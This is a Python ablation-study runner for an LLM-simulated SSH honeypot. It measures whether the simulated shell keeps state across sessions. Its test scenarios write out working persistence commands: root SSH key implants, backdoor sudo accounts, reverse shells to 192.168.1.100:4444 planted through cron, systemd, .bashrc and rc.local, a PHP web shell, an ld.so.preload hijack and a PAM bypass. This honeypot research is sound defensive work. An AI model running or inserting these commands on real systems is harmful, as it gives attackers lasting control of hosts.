#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Ablation Study Runner for PromptShield
"""

import asyncio
import json
import shutil
import os
import sys
import time
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional

# Add project root to sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ablation_study.injection_variants import InjectionMode
from ablation_study.raw_history_store import RawHistoryStore
from mcp_client import HoneypotMCPClient
from mcp_state_manager.command_analyzer import CommandAnalyzer
from mcp_state_manager.system_template import ContextOptimizer

# Import AI clients
from dotenv import dotenv_values
import openai
from deepseek_client import DeepSeekClient, DeepSeekChatCompletion

# Import original logic for baseline
try:
    from LinuxSSHbot_mcp import build_enhanced_messages
except ImportError:
    # Fallback if running from subdir
    sys.path.append("..") 
    from LinuxSSHbot_mcp import build_enhanced_messages

def p(msg):
    print(msg, flush=True)

# Config
config = dotenv_values(".env")
api_provider = config.get("API_PROVIDER", "openai").lower()

if api_provider == "openai":
    openai.api_key = config["OPENAI_API_KEY"]
    openai_client = openai.OpenAI(api_key=config["OPENAI_API_KEY"])
    chat_client = None
elif api_provider == "deepseek":
    deepseek_client = DeepSeekClient(
        api_key=config["DEEPSEEK_API_KEY"],
        base_url=config.get("DEEPSEEK_BASE_URL", "https://api.deepseek.com")
    )
    chat_client = DeepSeekChatCompletion(deepseek_client)

@dataclass
class AblationMetric:
    mode: str
    scenario_id: str
    success: bool
    latency_ms: float
    prompt_tokens: int
    context_tokens: int
    fidelity_score: float # Placeholder 1.0 or 0.0 based on success

class AblationExecutor:
    def __init__(self, storage_path="./ablation_memory"):
        self.storage_path = storage_path
        self.test_ip = "192.168.100.100"
        self.raw_store = RawHistoryStore.get_instance()
        self.metrics: List[AblationMetric] = []
        self.analyzer = CommandAnalyzer()
        self.mcp_client = None
        self.context_optimizer = ContextOptimizer()

    async def setup(self):
        if os.path.exists(self.storage_path):
            shutil.rmtree(self.storage_path)
        os.makedirs(self.storage_path, exist_ok=True)
        
        self.mcp_client = HoneypotMCPClient(
            storage_path=self.storage_path,
            global_singleton_mode=True
        )
        await self.mcp_client.connect()
        self.raw_store.clear()

    async def cleanup(self):
        if self.mcp_client:
            await self.mcp_client.close()
        # Clean up storage to save space? specific for ablation maybe keep last run
        pass 

    async def _get_full_context(self):
        # Read from local state file for FULL_CONTEXT simulation
        # The MCP client saves state to {storage_path}/states/{ip}.json
        state_file = os.path.join(self.storage_path, "states", f"{self.test_ip}.json")
        if os.path.exists(state_file):
            with open(state_file, 'r', encoding='utf-8') as f:
                return f"[FULL SYSTEM STATE DUMP]\n{f.read()}\n[END DUMP]"
        return ""

    async def build_context(self, mode: InjectionMode, command: str) -> str:
        if mode == InjectionMode.ORIGINAL:
            # Use original logic via `build_enhanced_messages`
            # We construct a fake message history
            base_msgs = [{"role": "system", "content": "dummy"}, {"role": "user", "content": command}]
            enhanced = await build_enhanced_messages(
                messages=base_msgs,
                command=command,
                current_cwd="/root",
                client=self.mcp_client,
                ip_address=self.test_ip
            )
            # Find injected context
            for msg in enhanced:
                if msg['role'] == 'system' and msg['content'] != "dummy":
                    return msg['content']
            return ""

        elif mode == InjectionMode.RAW_HISTORY:
            history = self.raw_store.get_history(self.test_ip)
            if not history: 
                return ""
            ctx = "PREVIOUS INTERACTION HISTORY:\n"
            for h in history:
                ctx += f"User: {h['command']}\nSystem: {h['response']}\n"
            return ctx

        elif mode == InjectionMode.FULL_CONTEXT:
            return await self._get_full_context()
        
        elif mode == InjectionMode.STATELESS:
            # No context injection - simulates baseline stateless architecture
            return ""
            
        return ""

    async def run_llm(self, messages):
        start = time.time()
        response_text = ""
        try:
            if api_provider == "openai":
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: openai_client.chat.completions.create(
                        model=config.get("OPENAI_MODEL", "gpt-3.5-turbo"),
                        messages=messages,
                        temperature=0.0
                    )
                )
                response_text = response.choices[0].message.content
            elif api_provider == "deepseek":
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: chat_client.create(
                        model=config.get("DEEPSEEK_MODEL", "deepseek-chat"),
                        messages=messages,
                        temperature=0.0
                    )
                )
                response_text = response.choices[0].message.content
        except Exception as e:
            response_text = f"Error: {e}"
        
        latency = (time.time() - start) * 1000
        return response_text, latency

    async def execute_step(self, command: str, mode: InjectionMode, is_verify: bool, scenario_id: str):
        # 1. Build Context
        context_str = ""
        if is_verify or mode == InjectionMode.FULL_CONTEXT: 
            # Note: RAW_HISTORY implants also need history context? 
            # Usually Session A steps are sequential. 
            # But for simplicity, we assume Session A is just one command (implant).
            # If Session A had multiple steps, we'd need history.
            # But here Implant is one step. So context is empty for first step usually.
            # Wait, verify is Session B (fresh session). 
            # So context is needed to bridge Session A -> B.
            context_str = await self.build_context(mode, command)

        # 2. Build Prompt
        system_prompt = "You are a Linux honeypot. Respond realistically."
        if context_str:
            system_prompt += f"\n\n{context_str}"

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": command}
        ]

        # 3. Estimates
        prompt_tokens = self.context_optimizer.estimate_token_count(system_prompt + command)
        context_tokens = self.context_optimizer.estimate_token_count(context_str)

        # 4. Run LLM
        response, latency = await self.run_llm(messages)

        # 5. Record Side Effects
        # RAW_HISTORY always records
        if mode == InjectionMode.RAW_HISTORY:
            self.raw_store.add_interaction(self.test_ip, command, response)
        
        # MCP always records (to build state for ORIGINAL/FULL)
        # We assume FULL_CONTEXT also populates the state DB, just doesn't use selective query
        # But for RAW_HISTORY, we might NOT want to populate MCP?
        # Actually, to be fair, "RAW_HISTORY" variant implies *absence* of structured state.
        # But if we don't call `record_event`, the state file won't be updated.
        # So we should call it for ORIGINAL and FULL.
        if mode != InjectionMode.RAW_HISTORY:
            # Need to categorize event first
            event_type = self.analyzer.determine_event_type(command)
            status = self.analyzer.determine_status(command, response)
            state_changes = self.analyzer.analyze_state_changes(command, response, "/root", None)
            
            await self.mcp_client.record_event(
                self.test_ip, "session", command, "root", 
                event_type.value, status.value, response,
                state_changes=[{
                    "target": sc.target,
                    "change_type": sc.change_type,
                    "old_value": sc.old_value,
                    "new_value": sc.new_value,
                    "metadata": sc.metadata
                } for sc in state_changes] if state_changes else []
            )

        return response, latency, prompt_tokens, context_tokens

    async def run_scenario(self, scenario, mode: InjectionMode):
        p(f"Run {scenario['id']} with {mode.name}...")
        
        # Reset env
        await self.setup()
        
        # Session A: Implant
        await self.execute_step(scenario['implant'], mode, False, scenario['id'])
        
        # Simulate Session Break
        await self.mcp_client.close() # Close MCP
        await asyncio.sleep(1)
        # new mcp client in setup() call? No, we are inside run_scenario.
        # We need to simulate fresh session.
        # For RAW_HISTORY: store persists in memory (simulating "History DB").
        # For OTHERS: MCP persists on disk.
        
        # Reconnect for Session B
        self.mcp_client = HoneypotMCPClient(self.storage_path, True)
        await self.mcp_client.connect()

        # Session B: Verify
        # Verify Command
        resp, lat, p_tok, c_tok = await self.execute_step(scenario['verify'], mode, True, scenario['id'])
        
        # Check Success
        success = all(k.lower() in resp.lower() for k in scenario['keywords'])
        
        return AblationMetric(
            mode=mode.name,
            scenario_id=scenario['id'],
            success=success,
            latency_ms=lat,
            prompt_tokens=p_tok,
            context_tokens=c_tok,
            fidelity_score=1.0 if success else 0.0
        )

# Complete HoneyComb scenarios matching Table 2 in paper
SCENARIOS = [
    # Account & Privilege (High complexity)
    {
        "id": "HC-T1098-004", 
        "implant": "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys",
        "verify": "cat /root/.ssh/authorized_keys",
        "keywords": ["ssh-rsa", "c2server@attacker"],
        "complexity": "High"
    },
    {
        "id": "HC-T1136-001", 
        "implant": "useradd -m -s /bin/bash -c 'System Service Account' sysupdate && echo 'sysupdate:B@ckd00r2024!' | chpasswd && usermod -aG sudo sysupdate && echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sysupdate", 
        "verify": "id sysupdate && grep sysupdate /etc/passwd && sudo -l -U sysupdate", 
        "keywords": ["uid=", "sysupdate", "sudo"],
        "complexity": "High"
    },
    # Scheduled Tasks (Medium/High)
    {
        "id": "HC-T1053-003", 
        "implant": "echo '*/15 * * * * /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"192.168.1.100\\\",4444));subprocess.call([\\\"bash\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"' | crontab -", 
        "verify": "crontab -l", 
        "keywords": ["reverse", "192.168.1.100"],
        "complexity": "Medium"
    },
    {
        "id": "HC-T1543-002", 
        "implant": "cat << 'EOF' > /etc/systemd/system/dbus-org.freedesktop.resolve1.service\n[Unit]\nDescription=Network Name Resolution\nAfter=network.target\n[Service]\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable dbus-org.freedesktop.resolve1.service",
        "verify": "systemctl is-enabled dbus-org.freedesktop.resolve1.service && systemctl cat dbus-org.freedesktop.resolve1.service | grep ExecStart",
        "keywords": ["enabled", "ExecStart", "192.168.1.100"],
        "complexity": "High"
    },
    # Boot/Logon Init (Low/Medium/High)
    {
        "id": "HC-T1546-004", 
        "implant": "echo 'export PROMPT_COMMAND=\"(nohup bash -c \\\"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\\\" &)\"' >> /root/.bashrc", 
        "verify": "cat /root/.bashrc | grep PROMPT_COMMAND", 
        "keywords": ["PROMPT_COMMAND", "192.168.1.100"],
        "complexity": "Low"
    },
    {
        "id": "HC-T1037-004", 
        "implant": "echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"192.168.1.100\\\",4444));subprocess.call([\\\"bash\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\" &' >> /etc/rc.local && chmod +x /etc/rc.local",
        "verify": "cat /etc/rc.local && ls -la /etc/rc.local",
        "keywords": ["#!/bin/bash", "192.168.1.100", "-rwx"],
        "complexity": "Medium"
    },
    {
        "id": "HC-T1078-003", 
        "implant": "usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody",
        "verify": "grep nobody /etc/passwd && sudo -l -U nobody",
        "keywords": ["/bin/bash", "NOPASSWD"],
        "complexity": "High"
    },
    # Hijacking/Backdoor (Low/Medium)
    {
        "id": "HC-T1505-003", 
        "implant": "echo '<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($c.\" 2>&1\");} ?>' > /var/www/html/.system.php",
        "verify": "cat /var/www/html/.system.php && ls -la /var/www/html/.system.php",
        "keywords": ["<?php", "system", ".system.php"],
        "complexity": "Low"
    },
    {
        "id": "HC-T1574-006", 
        "implant": "echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir -p /usr/local/lib && touch /usr/local/lib/libsystem.so",
        "verify": "cat /etc/ld.so.preload && ls -la /usr/local/lib/libsystem.so",
        "keywords": ["libsystem.so", "/usr/local/lib"],
        "complexity": "Medium"
    },
    {
        "id": "HC-T1556-003", 
        "implant": "sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/sshd",
        "verify": "head -1 /etc/pam.d/sshd",
        "keywords": ["pam_permit.so"],
        "complexity": "Medium"
    }
]

async def main():
    executor = AblationExecutor()
    results = []
    
    # All 4 ablation modes including STATELESS
    modes = [InjectionMode.ORIGINAL, InjectionMode.RAW_HISTORY, InjectionMode.FULL_CONTEXT, InjectionMode.STATELESS]
    
    for mode in modes:
        p(f"\n{'='*50}")
        p(f"Testing Mode: {mode.name}")
        p(f"{'='*50}")
        for scen in SCENARIOS:
            metric = await executor.run_scenario(scen, mode)
            results.append(asdict(metric))
            p(f"  [{scen['id']}] Success: {metric.success}, Latency: {metric.latency_ms:.0f}ms, Context Tokens: {metric.context_tokens}")
            time.sleep(2) # Rate limit

    with open("ablation_study/ablation_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    # Print summary
    p("\n" + "="*50)
    p("ABLATION STUDY SUMMARY")
    p("="*50)
    for mode in modes:
        mode_results = [r for r in results if r['mode'] == mode.name]
        success_count = sum(1 for r in mode_results if r['success'])
        avg_latency = sum(r['latency_ms'] for r in mode_results) / len(mode_results) if mode_results else 0
        avg_tokens = sum(r['context_tokens'] for r in mode_results) / len(mode_results) if mode_results else 0
        p(f"{mode.name}: SFR={success_count}/{len(mode_results)}, Avg Latency={avg_latency:.0f}ms, Avg Context Tokens={avg_tokens:.0f}")
    
    p("\nDone. Saved to ablation_study/ablation_results.json")

if __name__ == "__main__":
    asyncio.run(main())
